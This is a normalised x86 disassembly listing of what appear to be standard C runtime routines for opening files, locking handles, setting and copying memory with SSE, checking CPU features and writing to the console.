mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_20047e1
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_20047ce
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_20047ce
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_20047f4
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_20047f4
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_20047ce
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_200d00b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_2008e30
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_20071ce
add esp 0xc
test eax eax
jne r-xdata
call sub_20047e1
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_2008e30
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_2008a42
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_20047f4
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_200d08c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_200e198
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_20071ce
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_200bad8
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_200bad8
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_2008a42
pop ecx
call sub_20047ce
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_2008e30
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_20080ed
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_2008e30
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_200bad8
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_200bad8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_200cc62
push 0x14
push r--data
call sub_200625c
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_20047ce
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_20062a1
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_200c543
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200cd00
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_200cd00
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_200d229
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_200cd2e
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200cc62
add esp 0x18
pop ebp
retn
sub_200cd4e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b9cb
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200ced4
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_200cef4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_2002d91
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_200cf39
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_200cf39
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_200cef4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_200cfe9
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_200d008
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_200cfe9
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_200d00b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_200d08c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_200d112
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_20047e1
mov [ eax ] esi
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_200d189
push 0xc
push r--data
call sub_200625c
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d220
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200aff6
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_200d229
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_200d250
push 0x18
push r--data
call sub_200625c
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_20056a2
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200d3e1
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_20062a1
retn
push 0x40
push 0x20
call sub_200b579
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_200d189
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_2005765
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_200d323
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_200aff6
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_200d3ea
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_200d441
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_200d441
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_200d3ea
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_200d520
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_200d4d0
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_200d58f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_200e443
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_2002d91
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_200d654
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_200893f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_20047ce
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_200d790
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_200d7bb
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
